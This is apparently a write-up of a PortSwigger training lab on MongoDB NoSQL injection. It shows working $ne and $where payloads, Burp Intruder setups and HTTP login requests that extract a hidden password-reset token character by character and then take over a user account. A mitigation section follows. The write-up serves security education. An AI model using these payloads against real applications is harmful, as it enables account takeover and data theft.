# 📘 PortSwigger Lab: Exploiting NoSQL operator injection to extract unknown fields

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-nosql-operator-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-unknown-fields
> 🎯 Topic: NoSQL Injection — exploiting operators ($ne, $where) to extract hidden fields
> 🧪 Difficulty: Practitioner
> ✅ Status: Solved
> 🛠 Tools: Burp Suite (Repeater, Intruder — Cluster bomb)

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🗺 Attack Scheme](#attack-scheme)
- [🔍 Step 1 — Recon & Detect `$ne`](#step1)
- [🔍 Step 2 — Confirm JS Injection via `$where`](#step2)
- [🔍 Step 3 — Enumerate Field Names (Object.keys)](#step3)
- [🔍 Step 4 — Validate Found Field on Endpoint](#step4)
- [🔍 Step 5 — Extract Token Value](#step5)
- [🔍 Step 6 — Reset Password & Log In](#step6)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

The login functionality is powered by MongoDB and is vulnerable to NoSQL injection. The task:

```text
1. Exfiltrate the password reset token for user carlos.
2. Log in as carlos.
```

> **Hint:** There is a hidden field in the database containing the token, not displayed in the response.

---

<a id="theory"></a>

## 🧠 Short Theory

NoSQL injection in MongoDB often occurs when user input is placed into a JSON request object without proper validation. Operators like `$ne` (not equal) or `$where` (JavaScript execution) allow altering the query logic.

Unlike classic SQL injection, there is no direct data output, but you can use **blind exfiltration**: forcing the database to answer "yes/no" questions about hidden fields through differences in server responses (e.g., "Account locked" vs "Invalid username or password").

---

<a id="idea"></a>

## 🧩 Core Idea

1. **`$ne` operator** allows bypassing password checks and confirming user existence.
2. **`$where` operator** allows injecting JavaScript code executed inside MongoDB. We use it to check conditions based on hidden fields.
3. **`Object.keys(this)`** returns an array of all field names in the user document. We enumerate indexes to find the token field name.
4. **`this.FIELD_NAME.match()`** allows character-by-character extraction of the token value using regex.

---

<a id="attack-scheme"></a>

## 🗺 Attack Scheme

```text
1. Detect:      $ne confirms vulnerability (Account locked).
2. JS Inject:   $where: "1" vs "0" → different responses.
3. Find Fields: Object.keys(this)[N].match(...) → enumerate field names.
4. Validate:    GET /forgot-password?NAME=invalid → Invalid token.
5. Extract:     this.NAME.match('^.{N}C.*') → enumerate token value.
6. Reset:       GET /forgot-password?NAME=TOKEN → change password.
```

---

<a id="step1"></a>

## 🔍 Step 1 — Recon & Detect `$ne`

1. Attempt login with `carlos` / `invalid` → `"Invalid username or password"`.
2. Change password to `{"$ne":"invalid"}` → get `"Account locked"`. This confirms `$ne` works and the vulnerability exists.

---

<a id="step2"></a>

## 🔍 Step 2 — Confirm JS Injection via `$where`

1. Add `"$where": "0"` → `"Invalid username or password"` (condition false).
2. Change to `"$where": "1"` → `"Account locked"` (condition true).
3. **Conclusion:** JavaScript in `$where` is executed.

---

<a id="step3"></a>

## 🔍 Step 3 — Enumerate Field Names (Object.keys)

Use Intruder (Cluster bomb) to enumerate field names by index.

**Payload:**
```json
"$where":"Object.keys(this)[§1§].match('^.{§2§}§3§.*')"
```
* **Payload 1:** field index (`0`, `1`, `2`, `3`, `4`...).
* **Payload 2:** character position (`0-20`).
* **Payload 3:** character (`a-z`, `A-Z`, `0-9`).

**Analysis:** Sort by Payload 1 and Length. Look for `"Account locked"` responses. Collect characters from Payload 3 by position. Result: field name `newPwdTkn`.

---

<a id="step4"></a>

## 🔍 Step 4 — Validate Found Field on Endpoint

1. Send `GET /forgot-password?foo=invalid` → normal response.
2. Send `GET /forgot-password?newPwdTkn=invalid` → `"Invalid token"` error.
3. This confirms the field `newPwdTkn` exists and is used in the password reset endpoint.

---

<a id="step5"></a>

## 🔍 Step 5 — Extract Token Value

Use Intruder (Cluster bomb) again, but change `$where`.

**Payload:**
```json
"$where":"this.newPwdTkn.match('^.{§1§}§2§.*')"
```
* **Payload 1:** character position (`0-20`).
* **Payload 2:** character (`a-z`, `A-Z`, `0-9`).

**Analysis:** Sort by Payload 1 and Length. Look for `"Account locked"`. Collect the token character by character.

---

<a id="step6"></a>

## 🔍 Step 6 — Reset Password & Log In

1. Send `GET /forgot-password?newPwdTkn=COLLECTED_TOKEN`.
2. Response contains a reset link. Open it via **Request in browser > Original session**.
3. Change Carlos's password and log in.

---

<a id="requests"></a>

## 📨 Example Requests

### Step 2 — JS Injection

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}
```

### Step 5 — Token Extraction (Intruder)

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.newPwdTkn.match('^.{§1§}§2§.*')"}
```

---

<a id="response"></a>

## 📥 Example Result

### Step 3 — Field Name Discovery

```text
Payload 1 (index): 4
Payload 2 (pos):   0
Payload 3 (char):  n
Length:            longer than others
→ "Account locked" (true)
```

### Step 5 — Token Assembly

```text
Position 0: e
Position 1: c
Position 2: 3
...
→ Token: ec3f9aedf1c147a4
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. POST /login → $ne → Account locked (vulnerability).
2. POST /login → $where: 1/0 → confirm JS injection.
3. Intruder → Object.keys(this)[N].match(...) → found field newPwdTkn.
4. GET /forgot-password?newPwdTkn=invalid → Invalid token.
5. Intruder → this.newPwdTkn.match(...) → extracted token.
6. GET /forgot-password?newPwdTkn=TOKEN → password reset.
7. Login carlos → Solved.
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

1. **No JSON validation:** Server accepts objects and MongoDB operators.
2. **Using `$where`:** Allows JS execution, granting access to `this` (the document).
3. **Distinguishable responses:** `"Account locked"` vs `"Invalid username or password"` — the oracle for blind exfiltration.
4. **Access to hidden fields:** `this.newPwdTkn` is available in the condition even if not output in the response.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

```text
1. Look for operators: $ne, $gt, $where — signs of NoSQL injection.
2. Create an oracle: Find any difference in responses (text, length, status).
3. Use $where: If JS is available, access document fields.
4. Automate: Intruder (Cluster bomb) is ideal for character-by-character enumeration.
5. Check endpoints: Found field names may work elsewhere (e.g., /forgot-password).
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

* **Wrong case:** `newPwdTkn` $
eq$ `newpwdTkn`. Always copy the exact name.
* **Missing cookie:** Intruder does not inherit the browser session. A fresh `Cookie: session=...` is required.
* **Empty field:** The token is created only after requesting a password reset. Initiate the reset first.
* **Wrong endpoint:** Use `GET /forgot-password` to validate the token, not `POST /login`.

---

<a id="defense"></a>

## 🛡 Mitigation

1. **Type validation:** Reject objects where a string is expected.
2. **Disable `$where`:** Remove or restrict `$where` in queries (`security.javascriptEnabled: false`).
3. **Parameterization:** Use strict filters instead of concatenation.
4. **Uniform errors:** `"Invalid username or password"` for all cases instead of `"Account locked"`.

---

<a id="checklist"></a>

## ✅ Checklist

- [ ] `$ne` confirms vulnerability
- [ ] `$where: 1/0` confirms JS injection
- [ ] Intruder finds field `newPwdTkn`
- [ ] `GET /forgot-password?newPwdTkn=invalid` → `Invalid token`
- [ ] Intruder extracts token
- [ ] Reset password and log in as carlos
- [ ] Status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved via blind exfiltration using MongoDB operators `$ne` and `$where`. We discovered the hidden field `newPwdTkn`, extracted its value character by character, and used it to reset the password. Key lesson: even if data is not displayed, it can be extracted by forcing the database to answer "yes/no" questions.

---

[⬆ Back to top](#top)
